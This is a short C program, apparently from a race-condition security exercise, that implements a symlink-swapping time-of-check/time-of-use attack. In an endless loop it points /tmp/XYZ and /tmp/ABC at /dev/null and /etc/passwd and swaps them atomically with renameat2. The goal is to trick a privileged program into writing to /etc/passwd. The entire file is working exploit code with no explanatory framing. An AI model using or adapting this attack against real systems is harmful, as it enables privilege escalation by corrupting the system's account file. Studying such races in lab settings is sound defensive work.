#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>

int main() {
	unsigned int flags = RENAME_EXCHANGE;

	while (1) {
		unlink("/tmp/XYZ");
		unlink("/tmp/ABC");
		symlink("/dev/null", "/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/ABC");
		usleep(1000);

		//unlink("/tmp/XYZ");
		//symlink("/etc/passwd", "/tmp/XYZ");
		renameat2(0, "/tmp/ABC", 0, "/tmp/XYZ", flags);
		usleep(1000);
	}

	return 0;
}

